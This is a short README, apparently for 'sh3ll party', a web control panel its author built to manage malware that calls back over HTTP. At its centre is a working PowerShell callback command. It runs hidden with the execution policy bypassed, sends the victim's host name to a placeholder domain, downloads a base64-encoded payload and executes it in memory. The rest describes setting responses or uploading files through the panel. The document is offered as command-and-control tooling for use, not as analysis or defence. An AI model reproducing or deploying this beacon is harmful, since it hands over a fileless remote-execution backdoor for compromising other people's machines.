sh3ll party
-----------
I had malware that called back at specified intervals via http but no frontend to manage it. This is what I came up with.

Callback script: `powershell -w hidden -ep bypass -nop -c "$i=(New-Object System.Net.WebClient);$i.Headers.add('hostid',[net.dns]::GetHostByName('').HostName);IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String(($i.DownloadString('http://your.domain.here')))))"`

Set response manually or upload a file. JQuery based datatables make it pretty. A bunch of shitty javascript makes it functional.
